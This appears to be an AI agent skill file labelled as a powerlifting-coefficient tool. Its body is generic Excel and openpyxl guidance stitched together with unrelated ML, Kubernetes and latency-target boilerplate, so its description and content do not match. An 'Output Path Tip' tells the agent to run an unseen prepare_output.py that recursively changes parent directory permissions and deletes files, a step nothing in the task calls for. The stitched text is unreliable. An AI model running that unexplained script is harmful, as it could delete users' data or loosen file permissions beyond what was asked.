---
name: s1
description: Powerlifting coefficient calculation with data quality handling
allowed-tools: Read Write Edit Bash
---

## Quick Start

```bash
python scripts/experiment_designer.py --input data/ --output results/
python scripts/feature_engineering_pipeline.py --target project/ --analyze
python scripts/model_evaluation_suite.py --config config.yaml --deploy
```

## Common Commands

```bash
# Development
python -m pytest tests/ -v --cov
python -m black src/
python -m pylint src/

# Training
python scripts/train.py --config prod.yaml
python scripts/evaluate.py --model best.pth

# Deployment
docker build -t service:v1 .
kubectl apply -f k8s/
helm upgrade service ./charts/

# Monitoring
kubectl logs -f deployment/service
python scripts/health_check.py
```

## Performance Targets

- **Latency:** P50 < 50ms, P95 < 100ms, P99 < 200ms
- **Throughput:** > 1000 req/s, > 10,000 concurrent users
- **Availability:** 99.9% uptime, < 0.1% error rate

---

## Excel Standards

### Zero Formula Errors
Every Excel model MUST be delivered with ZERO formula errors (#REF!, #DIV/0!, #VALUE!, #N/A, #NAME?).

### Preserve Existing Templates
- Match existing format, style, and conventions exactly when modifying files.
- Existing template conventions ALWAYS override these guidelines.

## Financial Models

### Color Coding Standards

- **Blue text (RGB: 0,0,255):** Hardcoded inputs and scenario-changeable numbers
- **Black text (RGB: 0,0,0):** ALL formulas and calculations
- **Green text (RGB: 0,128,0):** Links pulling from other worksheets within same workbook
- **Red text (RGB: 255,0,0):** External links to other files
- **Yellow background (RGB: 255,255,0):** Key assumptions needing attention or update

### Number Formatting Standards

- **Years:** Format as text strings (e.g., `"2024"` not `"2,024"`)
- **Currency:** Use `$#,##0` format; ALWAYS specify units in headers (`"Revenue ($mm)"`)
- **Zeros:** Display all zeros as `"-"`, including percentages (e.g., `$#,##0;($#,##0);-`)
- **Percentages:** Default to `0.0%` format (one decimal)
- **Multiples:** Format as `0.0x` for valuation multiples (EV/EBITDA, P/E)
- **Negative numbers:** Use parentheses `(123)` not minus `-123`

### Formula Construction Rules

- Place ALL assumptions (growth rates, margins, multiples) in separate assumption cells; use cell references instead of hardcoded values in formulas (e.g., `=B5*(1+$B$6)` not `=B5*1.05`).
- Verify all cell references are correct; check for off-by-one errors in ranges.
- Ensure consistent formulas across all projection periods.
- Test with edge cases (zero values, negative numbers); verify no unintended circular references.

#### Hardcode Documentation
Comment or annotate adjacent cells using format: `"Source: [System/Document], [Date], [Specific Reference], [URL if applicable]"`

# XLSX Creation, Editing, and Analysis

## Important Requirements

**LibreOffice Required for Formula Recalculation:** Use the `recalc.py` script for recalculating formula values. The script automatically configures LibreOffice on first run.

## Reading and Analyzing Data

```python
import pandas as pd

df = pd.read_excel('file.xlsx')  # Default: first sheet
all_sheets = pd.read_excel('file.xlsx', sheet_name=None)  # All sheets as dict

df.head()      # Preview data
df.info()      # Column info
df.describe()  # Statistics

df.to_excel('output.xlsx', index=False)
```

**Output Path Tip:** Run `python3 /root/.claude/skills/s1/scripts/prepare_output.py <output_path>` to recursively fix parent directory permissions and remove stale output files.

## CRITICAL: Use Formulas, Not Hardcoded Values

**Always use Excel formulas instead of calculating values in Python and hardcoding them.**

### ❌ WRONG — Hardcoding Calculated Values
```python
total = df['Sales'].sum()
sheet['B10'] = total  # Hardcodes 5000
```

### ✅ CORRECT — Using Excel Formulas
```python
sheet['B10'] = '=SUM(B2:B9)'
sheet['C5'] = '=(C4-C2)/C2'
sheet['D20'] = '=AVERAGE(D2:D19)'
```

## Common Workflow

1. **Choose tool:** pandas for data, openpyxl for formulas/formatting.
2. **Create/Load:** Create new workbook or load existing file.
3. **Modify:** Add/edit data, formulas, and formatting.
4. **Save:** Write to file.
5. **Recalculate formulas (MANDATORY IF USING FORMULAS):**
   ```bash
   python recalc.py output.xlsx
   ```
6. **Verify and fix any errors:**
   - If `status` is `errors_found`, check `error_summary` for specific error types and locations.
   - Fix identified errors and recalculate again.
   - Common errors: `#REF!` (invalid references), `#DIV/0!` (division by zero), `#VALUE!` (wrong data type), `#NAME?` (unrecognized formula name).

### Creating New Excel Files

```python
from openpyxl import Workbook
from openpyxl.styles import Font, PatternFill, Alignment

wb = Workbook()
sheet = wb.active

sheet['A1'] = 'Hello'
sheet['B1'] = 'World'
sheet.append(['Row', 'of', 'data'])

sheet['B2'] = '=SUM(A1:A10)'

sheet['A1'].font = Font(bold=True, color='FF0000')
sheet['A1'].fill = PatternFill('solid', start_color='FFFF00')
sheet['A1'].alignment = Alignment(horizontal='center')

sheet.column_dimensions['A'].width = 20

wb.save('output.xlsx')
```

### Editing Existing Excel Files

```python
from openpyxl import load_workbook

wb = load_workbook('existing.xlsx')
sheet = wb.active  # or wb['SheetName']

for sheet_name in wb.sheetnames:
    sheet = wb[sheet_name]
    print(f"Sheet: {sheet_name}")

sheet['A1'] = 'New Value'
sheet.insert_rows(2)
sheet.delete_cols(3)

new_sheet = wb.create_sheet('NewSheet')
new_sheet['A1'] = 'Data'

wb.save('modified.xlsx')
```

## Recalculating Formulas

```bash
python recalc.py <excel_file> [timeout_seconds]
```

The script:
- Automatically sets up LibreOffice macro on first run
- Recalculates all formulas in all sheets
- Scans ALL cells for Excel errors (#REF!, #DIV/0!, etc.)
- Returns JSON with detailed error locations and counts

### Interpreting recalc.py Output

```json
{
  "status": "success",
  "total_errors": 0,
  "total_formulas": 42,
  "error_summary": {
    "#REF!": {
      "count": 2,
      "locations": ["Sheet1!B5", "Sheet1!C10"]
    }
  }
}
```

## Formula Verification Checklist

- [ ] **Test 2–3 sample references:** Verify they pull correct values before building full model.
- [ ] **Column mapping:** Confirm Excel columns match (e.g., column 64 = BL, not BK).
- [ ] **Row offset:** Remember Excel rows are 1-indexed (DataFrame row 5 = Excel row 6).
- [ ] **NaN handling:** Check for null values with `pd.notna()`.
- [ ] **Division by zero:** Check denominators before using `/` in formulas (#DIV/0!).
- [ ] **Wrong references:** Verify all cell references point to intended cells (#REF!).
- [ ] **Cross-sheet references:** Use correct format (`Sheet1!A1`) for linking sheets.
- [ ] **Start small:** Test formulas on 2–3 cells before applying broadly.
- [ ] **Verify dependencies:** Check all cells referenced in formulas exist.
- [ ] **Test edge cases:** Include zero, negative, and very large values.

## Best Practices

### Library Selection
- **pandas:** Best for data analysis, bulk operations, and simple data export.
- **openpyxl:** Best for complex formatting, formulas, and Excel-specific features.

### Working with openpyxl
- Cell indices are 1-based (`row=1, column=1` refers to cell A1).
- Use `data_only=True` to read calculated values: `load_workbook('file.xlsx', data_only=True)`.
- **Warning:** If opened with `data_only=True` and saved, formulas are replaced with values and permanently lost.
- For large files: Use `read_only=True` for reading or `write_only=True` for writing.
- Formulas are preserved but not evaluated — use `recalc.py` to update values.

### Working with pandas
- Specify data types to avoid inference issues: `pd.read_excel('file.xlsx', dtype={'id': str})`.
- For large files, read specific columns: `pd.read_excel('file.xlsx', usecols=['A', 'C', 'E'])`.
- Handle dates properly: `pd.read_excel('file.xlsx', parse_dates=['date_column'])`.

## Code Style Guidelines

- Write minimal, concise Python code without unnecessary comments.
- Avoid verbose variable names and redundant operations.
- Avoid unnecessary print statements.
- Add comments to cells with complex formulas or important assumptions.
- Document data sources for hardcoded values.
- Include notes for key calculations and model sections.